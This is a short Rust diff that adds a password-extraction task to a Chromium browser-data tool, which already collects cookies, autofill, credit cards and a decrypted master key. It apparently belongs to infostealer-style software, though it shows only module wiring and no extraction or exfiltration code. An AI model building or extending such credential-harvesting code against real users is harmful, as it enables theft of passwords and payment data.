@@ -1,6 +1,7 @@
 mod cookies;
 mod bookmarks;
 mod autofill;
+mod passwords;
 mod creditcards;
 mod downloads;
 
@@ -15,6 +16,7 @@ use utils::browsers::chromium::extract_master_key;
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
+use crate::chromium::passwords::PasswordsTask;
 use crate::chromium::downloads::DownloadsTask;
 use crate::chromium::creditcards::CreditCardsTask;
 
@@ -40,6 +42,7 @@ impl ChromiumTask<'_> {
                     CookiesTask::new(browser.clone()),
                     BookmarksTask::new(browser.clone()),
                     AutoFillTask::new(browser.clone()),
+                    PasswordsTask::new(browser.clone()),
                     DownloadsTask::new(browser.clone()),
                     CreditCardsTask::new(browser.clone())
                 )
